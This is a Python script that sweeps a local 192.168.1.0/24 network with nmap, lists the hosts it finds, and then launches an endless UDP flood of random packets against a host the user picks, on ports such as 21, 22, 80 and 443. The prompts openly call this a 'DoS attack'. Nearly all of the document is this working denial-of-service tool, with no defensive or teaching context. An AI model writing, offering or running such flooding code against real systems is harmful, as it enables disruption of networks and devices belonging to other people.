import socket
import random
import sys
import subprocess
from multiprocessing import Pool, Process

def get_hostname(ip):
    try:
        hostname = socket.gethostbyaddr(ip)[0]
    except:
        hostname = None
    return hostname

def scan_network(ip):
    try:
        hostname = get_hostname(ip)
        return (ip, hostname)
    except:
        return (ip, None)

def start_attack(ip):
    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    package = random._urandom(1024)
    ports = {21, 22, 23, 24, 25, 26, 27, 80, 143, 443}
    while True:
        for port in ports:
            sock.sendto(package, (ip, port))


if __name__ == "__main__":
    print("\033[4;31mScanning network...\033[0m\n")
    try:
        nmap_output = subprocess.check_output(["nmap", "-sP", "-n", "192.168.1.0/24"]).decode("utf-8")
        ip_list = []
        for line in nmap_output.splitlines():
            if "Nmap scan report for" in line:
                ip = line.split()[4]
                ip_list.append(ip)
        pool = Pool(processes=50)
        results = pool.map(scan_network, ip_list)
        pool.close()
        pool.join()
        ip_dict = dict(results)
        print("\033[4;31m{:<5} {:<20} {:<}\033[0m".format("ID", "IP Address", "Hostname"))
        for i, ip in enumerate(ip_list):
            hostname = ip_dict[ip]
            if hostname is None:
                print("{:<5} {:<20}".format(chr(ord('a') + i) + ")", ip))
            else:
                print("{:<5} {:<20} {:<}".format(chr(ord('a') + i) + ")", ip, hostname))
    except:
        print("\033[4;31mError: nmap command not found.\033[0m")
        sys.exit()

    try:
        custom_ip = input("\nEnter the \033[4;31mID\033[0m or the last three digits of the \033[4;31mIP\033[0m address you want to flood:  ")
        num = int(input("Enter the number of simultaneous \033[4;31mprocesses\033[0m you want to run:  "))
        if custom_ip.isdigit():
            target_ip = "192.168.1." + custom_ip
        elif custom_ip.isalpha() and ord(custom_ip) - ord('a') < len(ip_list):
            target_ip = ip_list[ord(custom_ip) - ord('a')]
        else:
            print("Invalid input")
            sys.exit()
        print("\nStarting \033[4;31mDoS\033[0m attack on %s..." % target_ip)
        
        pool = Pool(processes=num)
        pool.map_async(start_attack, [target_ip])

        while True:
            pass

    except KeyboardInterrupt:
        print("Caught \033[4;31mKeyboardInterrupt\033[0m, stopping attacks...")
        pool.terminate()
        pool.join()